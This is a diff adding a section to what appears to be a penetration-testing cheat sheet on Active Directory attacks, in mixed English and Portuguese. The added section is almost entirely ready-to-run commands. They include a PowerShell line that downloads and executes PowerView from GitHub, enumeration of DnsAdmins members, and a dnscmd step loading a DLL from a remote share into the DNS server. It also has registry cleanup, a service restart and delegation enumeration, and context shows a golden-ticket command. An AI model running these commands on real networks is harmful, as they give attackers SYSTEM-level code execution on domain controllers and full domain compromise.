@@ -1495,7 +1495,54 @@ kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-312420
 ```
 
 
+## ATAQUE DNSADMIN
+If you own a user who is a member of the 'DNS admin' it is possible to perform various attacks on the DNS server (usually Domain Controller) It is possible to get a reverse shell with this, but this puts the whole DNS traffic flat within the domain as this keeps the DNS service busy! For more information see [ https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise ]
+##### DNSADMIN - LOAD REQUIREMENTS
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
+```
+##### DNSADMIN - FIND MEMBERS OF DNSADMIN 
+```
+Get-ADGroupMember -Identity "DNSADMINS" | select objectClass, SamAccountName | Format-Table
+```
+```
+Get-NetgroupMember -identity 'DNSADMINS'
+Get-NetgroupMember -identity 'DNSADMINS' | select MemberName
+Get-NetgroupMember -identity 'DNSADMINS' | select groupname,MemberName,MemberObjectClass
+Get-NetgroupMember -identity 'DNSADMINS' -domain 'tech.local'
+```
+##### DNSADMIN ATTACK (MUST HAVE RSAT DNS) (CRIAR UM COMPARTILHAMENTO E COLOCAR A DLL LÁ)
+Share the directory the DLl is in for everyone so its accessible. logs all DNS queries on C:\Windows\System32\kiwidns.log
+```
+dnscmd tech-dnsserver01 /config /serverlevelplugindll \\10.10.10.10\dll\mimilib.dll
+```
+DELETAR CHAVE DO REGISTRO:
+```
+Get-ItemPropertyValue -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll
+Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll
+```
+RESTART THE DNS SERVER
+```
+Sc \\tech-dnsserver01 stop dns
+Sc \\tech-dnsserver01 start dns
+```
 
+
+
+
+
+
+```
+$FormatEnumerationLimit=-1
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+```
+ENCONTRAR APENAS USUARIOS
+```
+$FormatEnumerationLimit=-1
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+```
 
 
 
